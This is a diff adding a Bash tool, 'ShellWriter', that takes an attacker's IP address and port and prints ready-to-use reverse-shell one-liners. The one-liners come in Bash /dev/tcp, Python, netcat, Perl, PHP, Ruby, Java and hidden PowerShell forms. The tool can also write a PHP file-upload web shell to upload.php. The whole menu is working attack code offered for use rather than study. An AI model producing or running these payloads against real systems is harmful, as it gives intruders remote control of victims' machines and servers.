@@ -1,0 +1,151 @@
+#!/bin/bash
+
+# Colors op
+RED="\e[31m"
+GREEN="\e[32m"
+YELLOW="\e[33m"
+RESET="\e[0m"
+
+# ip validations
+validate_ip() {
+    local ip=$1
+    if [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+        IFS='.' read -r -a octets <<< "$ip"
+        for octet in "${octets[@]}"; do
+            if (( octet < 0 || octet > 255 )); then
+                echo -e "${RED}❌ Invalid IP address: $ip${RESET}"
+                exit 1
+            fi
+        done
+        return 0
+    else
+        echo -e "${RED}❌ Invalid IP address format: $ip${RESET}"
+        exit 1
+    fi
+}
+
+# prt valid
+validate_port() {
+    local port=$1
+    if [[ ! $port =~ ^[0-9]+$ ]] || (( port < 1 || port > 65535 )); then
+        echo -e "${RED}❌ Invalid port number: $port${RESET}"
+        exit 1
+    fi
+}
+
+# matte error sanam e
+show_help() {
+    echo -e "${YELLOW}📜 ShellWriter - A simple Bash tool by CyberShogun${RESET}"
+echo ""
+     echo " "
+
+    echo -e "${GREEN}Usage:${RESET} shellwriter <IP_ADDRESS> <PORT>"
+    echo -e "${GREEN}Options:${RESET}"
+    echo -e "  -h, --help   Show the help message"
+    exit 0
+}
+
+# still dev
+if [[ $# -eq 0 ]]; then
+    figlet shellwriter
+    # echo "                        Assembled by CyberShogun "
+         echo -e "                ${YELLOW} by CyberShogun${RESET}"
+    echo -e "${GREEN}Usage:${RESET} shellwriter <IP_ADDRESS> <PORT>"
+    echo -e "${GREEN}Options:${RESET}"
+    echo "  -h, --help   Show this help message"
+ echo ""
+ echo ""
+echo ""
+# echo " shellwriter -h for more
+ exit 0
+fi
+
+# stil devlp
+if [[ $1 == "-h" || $1 == "--help" ]]; then
+    show_help
+fi
+
+# filtter
+if [[ $# -ne 2 ]]; then
+    echo -e "${RED}❌ Usage: ./shellwriter.sh <IP_ADDRESS> <PORT>${RESET}"
+    exit 1
+fi
+
+#valid sisssions
+echo -e "${YELLOW}⚠️  Validating IP and Port... Please wait.${RESET}"
+
+
+validate_ip "$1"
+validate_port "$2"
+
+#
+IP="$1"
+PORT="$2"
+
+echo -e "${GREEN}✅ IP and Port are valid: $IP:$PORT${RESET}"
+echo -e "${YELLOW}Choose a reverse shell type:${RESET}"
+echo "a) Bash"
+echo "s) Python"
+echo "d) Python3"
+echo "f) Netcat"
+echo "g) Perl"
+echo "h) PHP"
+echo "j) Ruby"
+echo "k) Java"
+echo "l) PowerShell"
+echo "u) PHP Upload Shell"
+
+read -p "Select an option (a/s/d/f/g/h/j/k/l/u): " choice
+
+case $choice in
+    a) # Bash 
+        payload="bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+        ;;
+    s) # Python 
+        payload="python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$IP\",$PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+        ;;
+    d) # Python3
+        payload="python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$IP\",$PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+        ;;
+    f) # Netcat 
+        payload="nc -e /bin/sh $IP $PORT"
+        ;;
+    g) # Perl
+        payload="perl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+        ;;
+    h) # PHP  Shell
+        payload="php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        ;;
+    j) # Ruby 
+        payload="ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$IP\",\"$PORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+        ;;
+    k) # Java Reverse Shell
+        payload="r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor();"
+        ;;
+    l) # PowerShell Reverse Shell
+        payload="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$IP\",$PORT);\$stream = \$client.GetStream();[byte[]] \$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()};\$client.Close()"
+        ;;
+    u) # PHP Upload Shell not php-p-p
+        payload="<?php
+if(isset(\$_FILES['file'])){
+    move_uploaded_file(\$_FILES['file']['tmp_name'], \$_FILES['file']['name']);
+    echo 'File uploaded!';
+}
+?>
+"
+        ;;
+    *) # Invalid 
+        echo -e "${RED}❌ Invalid choice!${RESET}"
+        exit 1
+        ;;
+esac
+
+# Out
+echo -e "${GREEN}✅ Payload Generated:${RESET}"
+echo -e "${YELLOW}$payload${RESET}"
+
+# If PHP Uploafile
+if [[ $choice == "u" ]]; then
+    echo "$payload" > upload.php
+    echo -e "${GREEN}📂 File saved as: upload.php${RESET}"
+fi
